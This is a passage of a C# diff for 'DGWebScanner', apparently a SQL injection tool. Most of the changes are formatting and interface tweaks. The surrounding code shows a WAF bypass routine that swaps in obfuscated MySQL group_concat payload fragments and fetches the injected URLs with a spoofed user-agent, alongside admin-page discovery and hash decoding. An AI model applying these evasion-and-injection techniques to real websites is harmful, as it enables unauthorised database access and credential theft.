                 Settings.Default["themeColorSetting"] = "DARK";
+                string colorString = accentColorComboBox.Text + "700";
+                Accent colorEnum;
+                Enum.TryParse(colorString, out colorEnum);
+                statusInfo.ForeColor = Color.FromArgb((int)colorEnum);
             }
             Settings.Default.Save();
         }
@@ -1314,7 +1327,7 @@ namespace DGWebScanner
 
         string[] WafBypassConcat(string url)
         {
-           Debug.WriteLine("wafBypassConcat URL: " + url);
+            Debug.WriteLine("wafBypassConcat URL: " + url);
             //If only 1 vulnerable column
             if (!vulnerableColumnsStatus.Text.Contains(","))
             {
@@ -1323,7 +1336,7 @@ namespace DGWebScanner
             }
             using (WebDownload client = new WebDownload())
             {
-               Debug.WriteLine("NEW WAFURL : " + url);
+                Debug.WriteLine("NEW WAFURL : " + url);
                 client.Headers.Add("user-agent",
                     "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                 int n = -1;
@@ -1341,7 +1354,7 @@ namespace DGWebScanner
                             if (!vulnerableColumnsStatus.Text.Contains(","))
                             {
                                 url = url.Replace(wafConcat[n].Replace(',', '+'), wafConcat[n + 1].Replace(',', '+'));
-                               Debug.WriteLine("now here : " + url);
+                                Debug.WriteLine("now here : " + url);
                             }
                             url = url.Replace(wafConcat[n], wafConcat[n + 1]);
 
@@ -1415,23 +1428,23 @@ namespace DGWebScanner
                            {
                                statusInfo.Text = "Performing WAF Bypass";
                            });
-                           Debug.WriteLine("URL: " + url);
-                           Debug.WriteLine("wafGroupConcat[n] : " + wafGroupConcat[n]);
-                           Debug.WriteLine("wafGroupConcat[n + 1] : " + wafGroupConcat[n + 1]);
+                            Debug.WriteLine("URL: " + url);
+                            Debug.WriteLine("wafGroupConcat[n] : " + wafGroupConcat[n]);
+                            Debug.WriteLine("wafGroupConcat[n + 1] : " + wafGroupConcat[n + 1]);
                             url = url.Replace(wafGroupConcat[n], wafGroupConcat[n + 1]);
-                           Debug.WriteLine(url);
+                            Debug.WriteLine(url);
                             if (url.Contains("/*!50000group_concat(2448") || url.Contains("/*!50000GRoUp_cOnCaT(2448"))
                             {
-                               Debug.WriteLine(url);
+                                Debug.WriteLine(url);
                                 string replacedUrl = url.Replace(",3559)", ",3559)*/");
-                               Debug.WriteLine("replacedURL : " + replacedUrl);
+                                Debug.WriteLine("replacedURL : " + replacedUrl);
                                 urlHtml = client.DownloadString(replacedUrl);
                             }
                             else
                             {
                                 urlHtml = client.DownloadString(url);
                             }
-                           Debug.WriteLine(url);
+                            Debug.WriteLine(url);
                         }
                         else
                         {
@@ -1535,12 +1548,12 @@ namespace DGWebScanner
 
         private void maybeAdminURLListBox_DoubleClick(object sender, EventArgs e)
         {
-            Clipboard.SetText(maybeAdminURLListBox.SelectedItem.ToString());
+            Process.Start(maybeAdminURLListBox.SelectedItem.ToString());
         }
 
         private void maybeAdminURLListBox_Click(object sender, EventArgs e)
         {
-            toolTip1.SetToolTip(maybeAdminURLListBox, "Double click to copy text");
+            toolTip1.SetToolTip(maybeAdminURLListBox, "Right click to copy text. Double click to open in browser.");
         }
 
         private void databaseGridView_ColumnAdded(object sender, DataGridViewColumnEventArgs e)
@@ -1677,11 +1690,11 @@ namespace DGWebScanner
             }
             if (decodedHash == "0")
             {
-                
-                decodeHashStatus.Invoke((MethodInvoker) delegate
-                {
-                    decodeHashStatus.Text = "Can't match hash";
-                });
+
+                decodeHashStatus.Invoke((MethodInvoker)delegate
+               {
+                   decodeHashStatus.Text = "Can't match hash";
+               });
             }
             else
             {
@@ -1690,12 +1703,20 @@ namespace DGWebScanner
                     decodeHashStatus.Text = "Decoded: " + decodedHash;
                 });
             }
-           
+
         }
 
         private void decodeHashWorker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
         {
             decodeHashButton.Enabled = true;
+        }
+
+        private void maybeAdminURLListBox_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                Clipboard.SetText(maybeAdminURLListBox.SelectedItem.ToString());
+            }
         }
     }
 }
